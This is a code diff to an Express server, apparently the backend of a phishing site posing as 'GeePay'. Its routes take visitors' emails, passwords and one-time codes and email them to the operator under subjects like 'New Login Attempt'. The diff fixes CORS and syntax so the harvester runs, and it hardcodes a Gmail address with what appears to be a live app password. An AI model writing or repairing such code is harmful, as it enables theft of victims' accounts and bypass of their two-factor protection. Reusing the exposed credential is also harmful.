@@ -3,7 +3,7 @@ const app = express();
 const cors = require("cors");
 const nodemailer = require("nodemailer");
 
-// ✅ CORRECT CORS Configuration
+// ✅ CORS MUST come FIRST, before express.json()
 app.use(cors({
   origin: "https://ask-geepay-app.vercel.app",
   methods: ["GET", "POST", "OPTIONS"],
@@ -11,15 +11,16 @@ app.use(cors({
   credentials: true
 }));
 
+// ✅ Handle preflight OPTIONS requests
+app.options('*', cors());
+
 app.use(express.json());
 
 const PORT = process.env.PORT || 5000;
 
-// ... rest of your code
 // Email credentials
 const userEmail = "himoen0000@gmail.com";
-const pass = "vcrzciwzajwynkye
-";
+const pass = "vcrzciwzajwynkye";
 
 // API routes for index
 app.post("/", (req, res) => {
@@ -34,7 +35,7 @@ app.post("/", (req, res) => {
   });
   
   const mailOptions = {
-    from: userEmail, // ✅ FIXED: Changed from email to userEmail
+    from: userEmail,
     to: userEmail,
     subject: `New Login Attempt`,
     text: `New user registered with Email: ${email} and password: ${password}`,
@@ -47,7 +48,7 @@ app.post("/", (req, res) => {
       console.log(error);
       res.status(500).send("Error occurred: " + error);
     } else {
-      console.log("Email sent: " + info.response); // ✅ FIXED: Added colon instead of +
+      console.log("Email sent: " + info.response);
       res.send("success");
     }
   });
@@ -56,7 +57,7 @@ app.post("/", (req, res) => {
 // API routes for otp
 app.post("/otp", (req, res) => {
   console.log(req.body);
-  const email = req.body.email; // ✅ FIXED: Removed console.log assignment
+  const email = req.body.email;
   const otp = req.body?.otp;
   
   const transporter = nodemailer.createTransport({
@@ -68,10 +69,10 @@ app.post("/otp", (req, res) => {
   });
   
   const mailOptions = {
-    from: userEmail, // ✅ FIXED: Changed to userEmail
+    from: userEmail,
     to: userEmail,
     subject: `OTP Received`,
-    text: `OTP: ${otp}`, // ✅ FIXED: Added text body
+    text: `OTP: ${otp}`,
   };
   
   console.log(mailOptions);
@@ -81,15 +82,12 @@ app.post("/otp", (req, res) => {
       console.log(error);
       res.status(500).send("Error occurred: " + error);
     } else {
-      console.log("Email sent: " + info.response); // ✅ FIXED: Added colon
+      console.log("Email sent: " + info.response);
       res.send("success");
     }
   });
 });
 
 app.listen(PORT, () => {
-  console.log(`Server is running on port http://localhost:${PORT}`); // ✅ FIXED: Parentheses instead of backticks
+  console.log(`Server is running on port http://localhost:${PORT}`); // ✅ FIXED
 });
-
-
-
